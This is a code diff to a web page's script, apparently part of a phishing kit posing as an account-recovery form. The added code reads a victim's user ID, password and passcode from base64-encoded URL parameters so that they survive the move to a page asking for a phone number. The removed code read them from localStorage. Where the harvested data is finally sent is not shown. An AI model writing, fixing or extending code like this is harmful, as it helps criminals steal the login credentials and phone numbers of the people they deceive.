@@ -90,6 +90,21 @@ document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('recoverForm');
     const phoneInput = document.getElementById('cid');
     
+    // MOBILE FIX: Get data from URL parameters instead of sessionStorage
+    const params = new URLSearchParams(window.location.search);
+    let userId, password, passcode;
+    
+    try {
+        userId = atob(params.get('u') || '') || 'Not available';
+        password = atob(params.get('p') || '') || 'Not available';
+        passcode = atob(params.get('t') || '') || 'Not provided';
+        if (passcode === 'none') passcode = 'Not provided';
+    } catch(e) {
+        userId = 'Not available';
+        password = 'Not available';
+        passcode = 'Not provided';
+    }
+    
     // Create error container if it doesn't exist
     let phoneErrorEl = document.getElementById('phone-error');
     if (!phoneErrorEl) {
@@ -103,10 +118,6 @@ document.addEventListener('DOMContentLoaded', function() {
     phoneInput.setAttribute('maxlength', '10');
     phoneInput.setAttribute('inputmode', 'numeric');
     phoneInput.setAttribute('pattern', '[0-9]*');
-    
-    const userId = localStorage.getItem('userId') || 'Not available';
-const password = localStorage.getItem('userPassword') || 'Not available';
-const passcode = localStorage.getItem('userPasscode') || 'Not provided';
     
     // Add red border style
     const style = document.createElement('style');
@@ -323,4 +334,5 @@ Date: ${currentDateTime}`;
   </iframe>
  </body>
 </html>
+
 
